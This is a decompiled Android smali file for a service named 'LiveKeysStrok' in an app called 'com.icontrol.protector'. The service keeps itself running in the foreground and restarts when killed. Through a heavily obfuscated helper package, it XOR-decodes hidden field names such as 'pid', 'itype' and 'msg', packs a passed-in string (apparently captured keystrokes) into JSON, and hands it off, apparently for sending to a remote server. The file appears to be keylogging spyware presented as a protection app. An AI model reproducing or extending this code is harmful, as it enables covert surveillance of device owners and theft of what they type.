.class public Lcom/icontrol/protector/LiveKeysStrok;
.super Landroid/app/Service;
.source "SourceFile"


# static fields
.field private static final b:Ljava/util/concurrent/ExecutorService;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x2

    invoke-static {v0}, Ljava/util/concurrent/Executors;->newFixedThreadPool(I)Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/LiveKeysStrok;->b:Ljava/util/concurrent/ExecutorService;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic a(Lcom/icontrol/protector/LiveKeysStrok;Landroid/content/Context;Ljava/lang/String;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2}, Lcom/icontrol/protector/LiveKeysStrok;->c(Landroid/content/Context;Ljava/lang/String;)V

    return-void
.end method

.method private b()V
    .locals 2

    .line 1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y80;->b()Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lcom/icontrol/protector/LiveKeysStrok;->b:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lcom/icontrol/protector/LiveKeysStrok$a;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/LiveKeysStrok$a;-><init>(Lcom/icontrol/protector/LiveKeysStrok;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;

    :cond_0
    return-void
.end method

.method private c(Landroid/content/Context;Ljava/lang/String;)V
    .locals 6

    .line 1
    const/4 v0, 0x2

    :try_start_0
    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v2, v1, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {p1, v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    if-nez p1, :cond_0

    return-void

    :cond_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const/4 v2, 0x3

    new-array v3, v2, [B

    fill-array-data v3, :array_4

    new-array v4, v1, [B

    fill-array-data v4, :array_5

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 p1, 0x5

    new-array v3, p1, [B

    fill-array-data v3, :array_6

    new-array v4, v1, [B

    fill-array-data v4, :array_7

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/16 v4, 0xa

    new-array v4, v4, [B

    fill-array-data v4, :array_8

    new-array v5, v1, [B

    fill-array-data v5, :array_9

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v3, 0x4

    new-array v3, v3, [B

    fill-array-data v3, :array_a

    new-array v4, v1, [B

    fill-array-data v4, :array_b

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    new-array p1, p1, [B

    fill-array-data p1, :array_c

    new-array v4, v1, [B

    fill-array-data v4, :array_d

    invoke-static {p1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, v3, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array p1, v2, [B

    fill-array-data p1, :array_e

    new-array v1, v1, [B

    fill-array-data v1, :array_f

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y80;->d(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void

    nop

    :array_0
    .array-data 1
        0x3t
        -0x7t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x4at
        -0x43t
        0x33t
        -0x48t
        0x76t
        -0xbt
        0x53t
        -0x28t
    .end array-data

    :array_2
    .array-data 1
        0x1et
        -0x14t
        0x56t
        -0x3bt
        0x12t
        -0x10t
        -0x34t
        0x1et
    .end array-data

    :array_3
    .array-data 1
        0x5at
        -0x77t
        0x20t
        -0x54t
        0x71t
        -0x6bt
        -0x5bt
        0x7at
    .end array-data

    :array_4
    .array-data 1
        0x45t
        0x5bt
        -0x1dt
    .end array-data

    :array_5
    .array-data 1
        0x35t
        0x32t
        -0x79t
        -0x76t
        0x9t
        0x10t
        0x5ft
        -0x7t
    .end array-data

    :array_6
    .array-data 1
        0x69t
        -0xdt
        -0x23t
        0x74t
        -0x7t
    .end array-data

    nop

    :array_7
    .array-data 1
        0x0t
        -0x79t
        -0x5ct
        0x4t
        -0x64t
        -0x23t
        -0x73t
        -0x5ct
    .end array-data

    :array_8
    .array-data 1
        -0x53t
        -0x74t
        -0x17t
        -0x70t
        0x51t
        -0x40t
        -0x66t
        0x67t
        -0x70t
        -0x6ct
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x2t
        -0x20t
        -0x65t
        -0x31t
        0x32t
        -0x54t
        -0xdt
        0x2t
    .end array-data

    :array_a
    .array-data 1
        0x6ct
        -0x5et
        0x77t
        -0x40t
    .end array-data

    :array_b
    .array-data 1
        0x1ft
        -0x29t
        0x15t
        -0x5dt
        0x69t
        -0x2at
        0x3et
        -0x54t
    .end array-data

    :array_c
    .array-data 1
        0x12t
        0x7dt
        -0x40t
        -0x42t
        0xet
    .end array-data

    nop

    :array_d
    .array-data 1
        0x79t
        0x11t
        -0x51t
        -0x27t
        0x7dt
        -0x27t
        -0x13t
        0x4at
    .end array-data

    :array_e
    .array-data 1
        0x2t
        -0x35t
        -0x5dt
    .end array-data

    :array_f
    .array-data 1
        0x6ft
        -0x48t
        -0x3ct
        -0x47t
        0x6dt
        0xct
        0x5ct
        0x51t
    .end array-data
.end method

.method private d(Landroid/content/Context;)V
    .locals 2

    .line 1
    :try_start_0
    invoke-static {p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mv;->b(Landroid/content/Context;)Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mv;

    move-result-object v0

    invoke-virtual {v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mv;->a(Landroid/content/Context;)Landroid/app/Notification;

    move-result-object p1

    if-nez p1, :cond_0

    new-instance p1, Landroid/app/Notification;

    invoke-direct {p1}, Landroid/app/Notification;-><init>()V

    :cond_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x22

    if-lt v0, v1, :cond_1

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->k:I

    const/high16 v1, 0x40000000    # 2.0f

    invoke-static {p0, v0, p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/rr;->a(Lcom/icontrol/protector/LiveKeysStrok;ILandroid/app/Notification;I)V

    goto :goto_0

    :cond_1
    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->k:I

    invoke-virtual {p0, v0, p1}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    sget p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->k:I

    new-instance v0, Landroid/app/Notification;

    invoke-direct {v0}, Landroid/app/Notification;-><init>()V

    invoke-virtual {p0, p1, v0}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    :goto_0
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 1

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/icontrol/protector/LiveKeysStrok;->d(Landroid/content/Context;)V

    invoke-direct {p0}, Lcom/icontrol/protector/LiveKeysStrok;->b()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-direct {p0, p1}, Lcom/icontrol/protector/LiveKeysStrok;->d(Landroid/content/Context;)V

    invoke-direct {p0}, Lcom/icontrol/protector/LiveKeysStrok;->b()V

    const/4 p1, 0x1

    return p1
.end method
